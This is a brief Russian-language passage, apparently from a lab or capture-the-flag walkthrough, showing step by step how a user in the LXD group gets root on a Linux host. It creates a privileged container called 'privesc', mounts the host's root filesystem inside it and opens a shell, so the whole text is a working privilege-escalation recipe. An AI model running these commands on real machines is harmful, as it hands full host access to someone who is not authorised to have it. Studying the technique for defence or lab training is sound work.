> lxc init goodpc privesc -c security.privileged=true

Что? Ошибка? нет пула памяти? гуглим.

> lxd init

далее по принципу установки да-да-да, запускай

повторяем…. вышло…

создадим виртуальный диск в контейнере

> lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true

готово, запускаемся

> lxc start privesc

> lxc exec privesc /bin/sh